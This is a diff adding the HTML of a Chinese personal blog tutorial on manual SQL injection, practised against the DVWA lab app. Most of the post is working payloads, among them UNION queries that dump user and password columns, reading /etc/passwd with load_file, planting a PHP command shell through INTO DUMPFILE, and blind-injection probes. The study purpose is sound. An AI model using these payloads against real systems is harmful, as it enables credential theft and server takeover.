@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-112417276-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics -->
+
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>手动漏洞挖掘（二） | Recall Hyx | Your star</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="漏洞">
+    <meta name="description" content="SQL 注入 服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器基于报错的检测方法  123‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错%() 基于布尔的检测–用来猜测服务器的SQL 语句结构121&apos; and &apos;1&apos;=&apos;1    /    1&apos; and &apos;11&apos; and &apos;1&apos;=&apos;2    /    1&apos; and">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="手动漏洞挖掘（二）">
+<meta property="og:url" content="http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/index.html">
+<meta property="og:site_name" content="Recall Hyx">
+<meta property="og:description" content="SQL 注入 服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器基于报错的检测方法  123‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错%() 基于布尔的检测–用来猜测服务器的SQL 语句结构121&apos; and &apos;1&apos;=&apos;1    /    1&apos; and &apos;11&apos; and &apos;1&apos;=&apos;2    /    1&apos; and">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-02-01T07:57:30.343Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="手动漏洞挖掘（二）">
+<meta name="twitter:description" content="SQL 注入 服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器基于报错的检测方法  123‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错%() 基于布尔的检测–用来猜测服务器的SQL 语句结构121&apos; and &apos;1&apos;=&apos;1    /    1&apos; and &apos;11&apos; and &apos;1&apos;=&apos;2    /    1&apos; and">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Recall HYX</h5>
+          <a href="mailto:quce.hu@qq.com" title="quce.hu@qq.com" class="mail">quce.hu@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/recallhyx" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">手动漏洞挖掘（二）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">手动漏洞挖掘（二）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-01-27T07:25:03.000Z" itemprop="datePublished" class="page-time">
+  2018-01-27
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL-注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">SQL 注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL盲注"><span class="post-toc-number">2.</span> <span class="post-toc-text">SQL盲注</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-手动漏洞挖掘（二）"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">手动漏洞挖掘（二）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-01-27 15:25:03" datetime="2018-01-27T07:25:03.000Z"  itemprop="datePublished">2018-01-27</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote>
+<p>服务端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器<br>基于报错的检测方法</p>
+</blockquote>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘ 单引号，在输入框输入一个单引号，如果数据库sql语句是直接拼接的，就会识别不了指令而报错</span><br><span class="line"><span class="meta">%</span></span><br><span class="line"><span class="comment">()</span></span><br></pre></td></tr></table></figure>
+<p>基于布尔的检测–用来猜测服务器的SQL 语句结构<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and '<span class="number">1</span>'='<span class="number">1</span>    /    <span class="number">1</span>' and '<span class="number">1</span></span><br><span class="line"><span class="number">1</span>' and '<span class="number">1</span>'='<span class="number">2</span>    /    <span class="number">1</span>' and '<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<p>检测数据库表有多少个字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">' order by 数字<span class="comment">--（空格） （--就是注释的意思，在--后面加空格才能使注释生效）</span></span><br><span class="line">（例：如果user表只有4个字段，那么以下sql语句会报错：<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>，</span><br><span class="line">而以下<span class="keyword">sql</span>语句正常：<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>）</span><br></pre></td></tr></table></figure></p>
+<p>联合查询<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">' union select <span class="number">1</span>,<span class="number">2</span>-- （空格）（还是需要在--后面加空格，由上面的注入得出该输入多少个数字，有<span class="number">4</span>个字段就输：<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>，</span><br><span class="line">这样就能得出查询的对应字段的名称）</span><br><span class="line">' union select user(),version()-- （空格）（还是需要在--后面加空格，user(),version()都是数据库默认的函数，得到用户和版本号，</span><br><span class="line">也可以根据版本号来看用的是什么数据库，比如MySql数据库版本号可能为<span class="number">5</span>，但Oracle数据库版本号不可能为<span class="number">5</span>,太久了，</span><br><span class="line">其他数据库函数：database()--数据库名称）</span><br><span class="line">ASCII转字符：char('字符')</span><br><span class="line">连接字符串：CONCAT_WS(CHAR(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),user(),database(),version())</span><br><span class="line">（连接字符串，就能把多个函数合并为一个，只占一个位置，CHAR(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>)就是以空格：空格的格式分隔开来）</span><br></pre></td></tr></table></figure></p>
+<p>针对MySQL数据库的一些SQL注入</p>
+<blockquote>
+<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等</p>
+</blockquote>
+<p>简单来说，我们只要利用information_schema 就能知道数据库存放了什么表，表里的字段是什么<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">所有库所有表/统计每库中表的数量</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> table_name,table_schema <span class="keyword">from</span> information_schema.<span class="built_in">tables</span>--+</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> table_schema,<span class="built_in">count</span>(*) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> table_schema--+</span><br><span class="line">dvwa库中的表名</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> table_name,table_schema <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema='dvwa'--+</span><br><span class="line">查到表名users后就查表中的字段</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> table_name,column_name <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema='dvwa' <span class="built_in">and</span> table_name='users'--+</span><br><span class="line">之后查询user，password的内容</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> user,password <span class="keyword">from</span> dvwa.users--+</span><br><span class="line">' <span class="built_in">union</span> <span class="keyword">select</span> <span class="built_in">null</span>,concat(user,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users--+（只是格式变了）</span><br></pre></td></tr></table></figure></p>
+<p>读取文件<br><code>&#39; union select null,load_file(&#39;/etc/passwd&#39;)--+</code><br>写入文件（利用 <code>into dumpfile</code>，这个指令还能把二进制还原，利用这个我们可以先把要传输的代码用二进制编码后传到数据库）<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' union select null,"&lt;?php passthru($_GET['</span>cmd<span class="string">']); ?&gt;" into DUMPFILE "/tmp/a.php"--+(tmp目录是所有用户都有权限读写执行)</span></span><br><span class="line"><span class="string">cat shell.php | xxd -ps | tr -d '</span>\n<span class="string">'（这句话就是把shell.php 下的内容转成十六进制，并且去掉换行符）</span></span><br><span class="line"><span class="string">'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">null</span>, (0<span class="title">x</span>十六进制内容) <span class="title">into</span> <span class="title">dumpfile</span> "/<span class="title">tmp</span>/<span class="title">a</span>.<span class="title">php</span>"--+（注意：<span class="title">get</span>请求有最大长度限制，所以内容太多会导致注入失败）</span></span><br></pre></td></tr></table></figure></p>
+<p>保存数据库<br><code>&#39; union select null, concat(user,0x3a,password) from users into OUTFILE &#39;/tmp/a.db&#39;</code><br>当数据库没有权限查看information_schema时，或者数据库限制不能使用 union,order by 查询<br>猜表有没有这个列，重复的工作可以用（Burp 的<code>intruder</code>用字典）<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> column <span class="keyword">is</span> <span class="keyword">null</span><span class="comment">--+ （column就是要替换的列，如果没有该列，就会报错，有的话就正常）</span></span><br></pre></td></tr></table></figure></p>
+<p>猜当前表表名（假如由上一步得出的其中一个列名为user）<br><code>and table.user is null--+ （table就是要替换的表名）</code><br>猜数据库的其他表<br><code>&#39; and (select count(*) from table)&gt;0--+ （table就是要替换的表名）</code><br>猜字段的内容<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'  <span class="keyword">or</span> <span class="attr">user=</span>'admin</span><br><span class="line">'  <span class="keyword">or</span> <span class="keyword">user</span> <span class="title">like</span> '%a%</span><br></pre></td></tr></table></figure></p>
+<p>当数据库可写<br><code>&#39;; update users set user=&#39;hyx&#39; where user=&#39;admin（两条语句先后执行）</code></p>
+<h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><blockquote>
+<p>不显示数据库内建的报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即 盲</p>
+</blockquote>
+<p>思路：既然无法基于报错信息判断结果，就基于逻辑真假的不同结果判断<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="number">1</span>' and <span class="number">1</span>=<span class="number">2</span></span><br><span class="line"><span class="number">1</span>' order by <span class="number">5</span>--+（如果sql语句有两个字段的话为假）</span><br><span class="line"><span class="number">1</span>' order by <span class="number">2</span>--+（如果sql语句有两个字段的话为真）</span><br></pre></td></tr></table></figure></p>
+<p>如果有sql注入漏洞的话，之后的操作都合上一篇的指令差不多</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2018-02-01T07:57:30.343Z" itemprop="dateUpdated">2018-02-01 15:57:30</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="Recall HYX">
+            Recall HYX
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&title=《手动漏洞挖掘（二）》 — Recall Hyx&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&title=《手动漏洞挖掘（二）》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《手动漏洞挖掘（二）》 — Recall Hyx&url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/01/31/XSS常用攻击手段/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">XSS常用攻击手段</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/01/27/手动漏洞挖掘（一）/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">手动漏洞挖掘（一）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'recallhyx';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Recall HYX &copy; 2017 - 2018</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&title=《手动漏洞挖掘（二）》 — Recall Hyx&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&title=《手动漏洞挖掘（二）》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《手动漏洞挖掘（二）》 — Recall Hyx&url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（二）/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACHUlEQVR42u3aW24CMRAEwNz/0psDIJbuMSTCLn9FyWJcG8ma189PvK4n6/GZ5Pn7HR5//7aFgYHxtYzrdj17pj1u8gpWdsDAwDiB8ewGu38muXDb6zv5XgwMDIxkuyTgyz/Vvj4MDAyM++2Si7JNTf/hwsXAwPhCRh6u3WPyv7Yh5ttycQwMjC9k5FX3v//5I/0NDAyMr2Jc5VoJJZMk9hotDAyMvRlt0T9PR2eNhNl5MDAwzmEkBbWk7NU2JttGAgYGxmmMFtAGi7NmQ30pY2BgbM1IDpdsnQ+EtZdpcd1jYGAcxlgP7PKL+13BIgYGxq6M9gMz5EpjoPg/YGBgbM3I09FZ+royFhalwRgYGFsz8hJ/y1hvMySpNQYGxgmM9ZbArOjWhpgvzoCBgXEAYzbmNUuA1xuZ0bAFBgbGdow87Fsv5RfDE+3MCAYGxqaMtljfjkS0gxp56Q0DA+NMRnsJtow2oa0bAxgYGFszko+tjE20L6INGTEwME5gtOlr2wxYf6PRDhgYGEcyZpds0lSYhYYvnsHAwDiGkQRzbVktf3FL6SsGBsamjKtcs9S3faZObjEwMLZmrBxrNgr25gELDAyMYxjJJTsros1S3PwMGBgYpzHa3Hc2zNo2O4t2AgYGBkYZCK7Hp3WbAQMDAyMeiM+LZe3Q6osiIAYGxgGMJIldv5o/uA8GBsbWjDZQWwHfh5XtwAcGBsYBjF9wUCy6umo+gAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
